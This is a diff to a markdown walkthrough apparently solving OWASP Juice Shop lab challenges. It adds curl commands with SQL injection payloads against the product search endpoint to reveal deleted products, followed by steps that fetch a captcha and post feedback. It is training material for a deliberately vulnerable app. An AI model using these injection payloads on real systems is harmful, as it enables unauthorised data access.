@@ -170,7 +170,27 @@ http http://juiceshop:3000/rest/user/login email="J12934@juice-sh.op" password='
 Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous
 
 ```bash
-TODO
+# list all products
+curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'+OR+1==1));--" | jq
+# list deleted products
+curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'+OR+deletedAt+IS+NOT+NULL));--" | jq
+
+# search for
+# Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos
+https://listverse.com/2011/07/08/top-20-fruits-you-probably-dont-know
+
+# comment Rippertuer Special Juice
+https://pastebin.com/90dUgd7s
+
+# read warning
+# Hueteroneel ... coupled with Eurogium Edule was sometimes found fatal
+
+# generate captcha
+curl http://juiceshop:3000/rest/captcha
+# {"captchaId":3,"captcha":"7*5*3","answer":"105"}
+
+# submit request
+curl -H "Content-Type: application/json" http://juiceshop:3000/api/Feedbacks --data-raw '{"captchaId":6,"captcha":"25","comment":"Hueteroneel Eurogium Edule","rating":1}'
 ```
 
 ## Login Amy
